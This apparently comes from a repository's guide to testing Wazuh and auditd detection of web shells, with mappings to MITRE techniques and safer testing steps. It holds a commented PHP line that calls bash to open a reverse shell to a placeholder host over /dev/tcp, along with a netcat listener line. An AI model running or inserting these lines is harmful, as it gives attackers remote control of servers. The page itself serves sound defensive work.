# Examples — Testing Wazuh Web Shell Detection (SAFE)

⚠️ **IMPORTANT SECURITY WARNING**

This document is provided **for defensive testing and documentation purposes only**.
It intentionally **does NOT provide a ready-to-run exploit**.

- Do **NOT** deploy executable web shells on production systems
- Perform any live execution tests **only in an isolated lab**
- Prefer `auditd` + `sudo -u <webuser>` CLI tests when possible

The examples below are **commented / non-executable illustrations** to help you
understand what the Wazuh rules are designed to detect.

---

## Scenario Overview

The rules are designed to detect the following behavior chain:

1. A web server process executes a shell
2. A reverse connection is established to an external host
3. The activity is captured by `auditd`
4. Wazuh correlates the event and raises an alert

---

## Example 1 — Web Server (Illustrative PHP snippet)

> ❌ **DO NOT RUN THIS CODE**
> 
> This is a **commented example** showing the *pattern* that the rules are meant to detect.

```php
<?php
// Illustrative example ONLY — do not execute
// exec('/bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"');
?>
```

### What this represents

- PHP invoking `exec()`
- Spawning `/bin/bash`
- Redirecting I/O over a TCP connection

➡️ This behavior maps directly to:

- **T1505.003** — Server-Side Web Shell
- **T1059.004** — Command-Line Interface

---

## Example 2 — Attacker / Testing Machine (Illustrative Listener)

> ❌ **DO NOT RUN ON PRODUCTION NETWORKS**

```bash
# Illustrative example ONLY — do not execute
# nc -lvp 4444
```

### What this represents

- A listener waiting for a reverse connection
- Typical in reverse shells and C2 callbacks

➡️ This activity maps to:

- **TA0011** — Command and Control
- **T1049** — System Network Connections Discovery

---

## Recommended SAFE Testing Method (Preferred)

Instead of deploying executable PHP code, test your rules using:

### 1️⃣ Controlled execution as web user

```bash
sudo -u www-data /bin/bash -lc 'id'
```

### 2️⃣ Wazuh rule validation

```bash
/var/ossec/bin/ossec-logtest
```

### 3️⃣ Auditd verification

```bash
ausearch -k apache-exec
```

These methods trigger **real auditd telemetry** without exposing a live web shell.

---

## Detection Outcome

When properly configured, the rules should generate alerts for:

- Command execution by the web server
- Outbound network connections initiated by the web server

---

## Final Note

> **If you feel the need to deploy a real web shell to test detection, stop and reassess.**

A correctly configured Wazuh + auditd stack can be validated **without introducing real risk**.

---

## License

MIT
